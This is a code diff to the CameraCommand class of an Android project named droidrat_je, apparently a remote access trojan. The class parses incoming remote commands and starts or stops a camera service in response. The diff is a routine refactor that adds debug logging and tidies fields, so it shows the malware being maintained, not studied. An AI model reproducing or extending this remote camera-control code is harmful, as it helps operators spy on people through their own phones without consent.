@@ -2,6 +2,7 @@ package com.je_chen.droidrat_je.rat.command;
 
 import android.content.Context;
 import android.content.Intent;
+import android.util.Log;
 
 import com.je_chen.droidrat_je.rat.command.process_super.CommandFather;
 import com.je_chen.droidrat_je.service.camera.CameraService;
@@ -11,15 +12,10 @@ import static com.je_chen.droidrat_je.service.command.ProcessCommandService.webs
 
 public class CameraCommand extends CommandFather {
 
-    private final String TAG = "Camera Event";
-
-    private Context context;
-
-    private CameraService cameraService;
+    private final Context context;
 
     public CameraCommand(Context context) {
         this.context = context;
-        cameraService = new CameraService();
     }
 
     @Override
@@ -31,15 +27,18 @@ public class CameraCommand extends CommandFather {
     public void processCommand(String command) {
         try {
             String[] rawCommandArray = command.split(" ");
+            String TAG = "Camera Event";
             switch (rawCommandArray[1]) {
 
                 case "StartCamera":
+                    Log.d(TAG, "StartCamera");
                     Intent startCameraIntent = new Intent(context, CameraService.class);
                     startCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                     context.startService(startCameraIntent);
                     break;
 
                 case "StopCamera":
+                    Log.d(TAG, "StopCamera");
                     Intent stopCameraIntent = new Intent(context, CameraService.class);
                     stopCameraIntent.setFlags(FLAG_ACTIVITY_NEW_TASK);
                     context.stopService(stopCameraIntent);
